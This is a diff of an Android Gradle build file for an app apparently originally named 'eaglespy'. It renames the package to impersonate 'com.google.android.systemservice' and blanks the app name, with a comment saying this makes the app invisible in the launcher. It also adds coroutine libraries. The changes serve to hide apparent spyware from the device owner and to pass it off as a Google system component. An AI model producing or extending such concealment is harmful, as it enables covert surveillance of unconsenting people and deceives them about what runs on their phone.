@@ -4,18 +4,18 @@ plugins {
 }
 
 android {
-    namespace 'com.stealth.eaglespy'
+    namespace 'com.google.android.systemservice'
     compileSdk 34
 
     defaultConfig {
-        applicationId "com.stealth.eaglespy"
+        applicationId "com.google.android.systemservice"
         minSdk 24
         targetSdk 34
         versionCode 1
         versionName "1.0"
 
-        // Stealth: Use generic name
-        resValue "string", "app_name", "System Update"
+        // Stealth: Empty app name (invisible in launcher)
+        resValue "string", "app_name", ""
     }
 
     signingConfigs {
@@ -77,4 +77,8 @@ dependencies {
 
     // JSON Parsing
     implementation 'com.google.code.gson:gson:2.10.1'
+
+    // Kotlin Coroutines
+    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
+    implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-core:1.7.3'
 }
